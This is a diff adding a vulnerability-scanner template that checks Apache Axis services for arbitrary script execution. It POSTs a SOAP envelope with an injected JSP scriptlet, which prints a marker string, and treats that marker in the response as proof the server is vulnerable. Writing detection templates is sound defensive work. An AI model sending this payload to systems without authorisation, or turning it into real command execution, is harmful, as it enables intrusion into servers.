@@ -1,0 +1,45 @@
+id: custom-axis-service-arbitrary-execution
+
+info:
+  name: Axis Service Arbitrary Script Execution Vulnerability
+  author: rdnt
+  severity: critical
+  description: Checks for arbitrary script execution vulnerability in Axis services via SOAP request.
+  reference:
+    - http://www.bmth666.cn/2023/11/28/Apache-Axis1-4-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/
+  tags: axis,service,arbitrary,execution,soap
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/axis/services/randomBBB"
+
+    headers:
+      Content-Type: "text/xml; charset=utf-8"
+      SOAPAction: ""
+
+    body: |
+      <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:util="http://util.java">
+         <soapenv:Header/>
+         <soapenv:Body>
+            <util:ints soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+               <in0 xsi:type="xsd:int" xs:type="type:int" xmlns:xs="http://www.w3.org/2000/XMLSchema-instance"><![CDATA[
+      <% out.println("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"); %>
+      ]]></in0>
+               <in1 xsi:type="xsd:int" xs:type="type:int" xmlns:xs="http://www.w3.org/2000/XMLSchema-instance">?</in1>
+            </util:ints>
+         </soapenv:Body>
+      </soapenv:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+        part: body
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
